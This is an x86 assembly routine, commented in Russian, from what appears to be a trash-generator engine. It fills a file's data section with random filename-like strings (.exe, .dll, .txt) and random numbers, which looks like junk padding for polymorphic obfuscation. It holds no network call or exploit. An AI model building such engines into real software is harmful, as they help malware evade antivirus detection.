;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xtg_dg_struct1_addr		equ		dword ptr [ebp + 24h]					;XTG_TRASH_GEN
xtg_dg_struct2_addr		equ		dword ptr [ebp + 28h]					;XTG_DATA_STRUCT

xtg_dg_tmp_var1			equ		dword ptr [ebp - 04]					;различные вспомогательные переменные
xtg_dg_tmp_var2			equ		dword ptr [ebp - 08]
xtg_dg_tmp_var3			equ		dword ptr [ebp - 12]
xtg_dg_tmp_var4			equ		dword ptr [ebp - 16]
xtg_dg_tmp_var5			equ		dword ptr [ebp - 20]

xstr_max_len			equ		16										;максимальный размер строки
xnum_size				equ		04										;размер генерируемого числа
xgen_str_len			equ		(16 * 04)								;длина строки символов - с помощью этих символов мы генерим строки; 16 (push) * 4 (кол-во символов в стеке); 
xstr_min_len			equ		07										;минимальная длина строки; 

xtg_data_gen:
	pushad																;сохраняем РОН в стеке
	cld
	mov		ebp, esp
	sub		esp, 24
	push	'abcd'														;01
	push	'efgh'														;02
	push	'ijkl'														;03
	push	'mnop'														;04
	push	'qrst'														;05
	push	'uvwx'														;06
	push	'yzAB'														;07
	push	'CDEF'														;08
	push	'GHIJ'														;09
	push	'KLMN'														;10
	push	'OPQR'														;11
	push	'STUV'														;12
	push	'WXYZ'														;13
	push	'0123'														;14
	push	'4567'														;15
	push	'89_a'														;16
	mov		xtg_dg_tmp_var5, esp										;сохраняем в данной переменной адрес строки, нужной для генерации строк; 
	mov		ebx, xtg_dg_struct1_addr
	assume	ebx: ptr XTG_TRASH_GEN
	mov		esi, xtg_dg_struct2_addr
	assume	esi: ptr XTG_DATA_STRUCT
	mov		edi, [esi].rdata_addr										;edi - адрес в файле(!), куда сгенерить рэндомные данные;
	mov		ecx, [esi].rdata_size										;ecx - размер этой области памяти; 
	mov		xtg_dg_tmp_var1, 'exe.'										;в следующие 3 переменные сохраним возможные расширения; 
	mov		xtg_dg_tmp_var2, 'lld.'
	mov		xtg_dg_tmp_var3, 'txt.'
	test	edi, edi													;если адрес в файле (но для тестов можно передавать адрес начала области данных (секции данных)) равен нулю, 
	je		_xdg_ret_													;то на выход; 
	cmp		ecx, 04h													;иначе если размер области (секции) данных меньше 4-х, тогда на выход; 
	jb		_xdg_ret_ 
	test	[esi].xmask, XTG_DG_NUM32									;если выставлен данный флаг, тогда принимаем за минимальный размер - размер числа - 4 байта; 
	je		_xmask_str_ 
_xmask_num_:															;4 байта;
	push	xnum_size
	pop		edx
	jmp		_xdg_nxt_1_
_xmask_str_:															;иначе 16 байт; 
	push	xstr_max_len
	pop		edx

_xdg_nxt_1_:

_xdg_cycle_:															;далее, в цикле заполним область памяти трэшаком-данными; 
	cmp		ecx, edx													;если кол-во оставшихся для генерации строк и чисел байтов меньше минимально размера, тогда на выход; 
	jl		_xdg_ret_ 

	push	02
	call	[ebx].rang_addr

	bt		[esi].xmask, eax											;иначе случайно определим, что сейчас будем генерировать: строку или число?
	jnc		_xdg_cycle_
	test	eax, eax
	je		xtg_dg_gen_strA
	dec		eax
	je		xtg_dg_gen_num32

_xdg_ret_:
	mov		eax, [esi].rdata_size
	sub		eax, ecx
	mov		[esi].nobw, eax 
	mov		dword ptr [ebp + 1Ch], eax									;eax - содержит кол-во реально записанных байтов; 
	mov		esp, ebp 
	popad
	ret		04 * 2
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи xtg_data_gen
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





;========================================[GEN STRING ANSI]===============================================
;'abcde'
;etc 
xtg_dg_gen_strA:
	cmp		ecx, xstr_max_len											;есть ли вариант сгенерить строку?
	jl		_xdg_cycle_
	push	ecx															;если да, тогда сначала сохраним нужные реги
	push	edx
	push	esi
	push	edi
	xor		edx, edx													;обнулим edx
	mov		esi, xtg_dg_tmp_var5										;esi - содержит адрес строки - из символов этой строки будем генерировать строки; 

	push	(xstr_max_len - xstr_min_len)
	call	[ebx].rang_addr

	add		al, xstr_min_len
	xchg	eax, ecx													;получаем случайный размер будущей строки (max размер строки сейчас = 16 байтов); и сохраняем его в ecx; 
	mov		xtg_dg_tmp_var4, ecx										;а также сохраним значение в данной переменной; 

	push	02
	call	[ebx].rang_addr

	test	eax, eax													;случайно определим, будем генерить строку с расширением или без?
	jne		_xdgs_name_

_xdgs_use_ext_:															;генерим строку с расширением; расширение состоит из 4 символов: '.' и ещё 3 различных символа; 
	push	04
	call	[ebx].rang_addr												;теперь случайно определим, какое именно будет расширение?

	test	eax, eax	
	je		_xdgs_exe_
	dec		eax
	je		_xdgs_dll_
	dec		eax
	je		_xdgs_txt_
_xdgs_xext_:															;тут создаем своё расширение; 
	push	edi
	lea		edi, dword ptr [edi + ecx - 04]								;edi = адрес строки + размер строки - 4 байта = адрес, где запишем расширение; 
	mov		al, '.'
	stosb																;записываем первый символ; 
	push	03
	pop		edx

_xdgs_xext_cycle_:
	push	xgen_str_len 
	call	[ebx].rang_addr												;и далее еще сгенерим и запишем еще 3 символа; 

	mov		al, byte ptr [esi + eax]									;эти символы выберем случайно из строки символов для генерации строк; 
	stosb
	dec		edx
	jne		_xdgs_xext_cycle_ 
	pop		edi
	jmp		_xdgs_nxt_2_ 
_xdgs_exe_:																;'.exe'
	push	xtg_dg_tmp_var1
	jmp		_xdgs_nxt_1_
_xdgs_dll_:																;'.dll'
	push	xtg_dg_tmp_var2
	jmp		_xdgs_nxt_1_
_xdgs_txt_:																;'.txt'
	push	xtg_dg_tmp_var3
_xdgs_nxt_1_: 
	pop		dword ptr [edi + ecx - 04]									;запишем;
_xdgs_nxt_2_:
	push	04															;тут скорректируем кол-во байтов для записи строки
	pop		edx															;так как расширение (4 байта) мы уже записали, то отнимем это число; 
	sub		ecx, edx

_xdgs_name_:
_xdgs_name_cycle_:														;а тут сгенерим и запишем имя; 
	push	xgen_str_len
	call	[ebx].rang_addr

	mov		al, byte ptr [esi + eax]
	stosb
	dec		ecx
	jne		_xdgs_name_cycle_ 
	add		edi, edx													;если же мы еще записывали расширение, то передвинем edi на конец расширения, чтобы записать нули в конце строки;
																		;если же расширения не было, тогда в edx будет 0 (edx = 0); 
	and		xtg_dg_tmp_var4, 03
	push	04
	pop		ecx
	sub		ecx, xtg_dg_tmp_var4										;а тут сделаем строку по длине кратной 4;
	xor		eax, eax
_xdgs_wzero_:	
	stosb																;запишем нули;
	dec		ecx
	jne		_xdgs_wzero_

	pop		edx
	mov		eax, edi
	sub		eax, edx
	pop		esi
	pop		edx
	pop		ecx
	sub		ecx, eax													;скорректируем счётчик - отнимем от кол-ва оставшихся байт длину только что записанной строки; 
	jmp		_xdg_cycle_
;========================================[GEN STRING ANSI]===============================================



;========================================[GEN NUMBER 32-BIT]=============================================	
;12h 34h 56h 78h
;etc
xtg_dg_gen_num32:
	cmp		ecx, xnum_size												;проверяем, есть ли байты для генерации числа?
	jl		_xdg_cycle_	
	push	edx

	push	10000h
	call	[ebx].rang_addr

	xchg	eax, edx

	push	edx
	call	[ebx].rang_addr

	and		eax, edx													;если так, то генерим СЧ
	pop		edx
	stosd																;и записываем его
	sub		ecx, xnum_size												;корректируем счётчик; 
	jmp		_xdg_cycle_ 
;========================================[GEN NUMBER 32-BIT]=============================================

 
 

 




	 
  

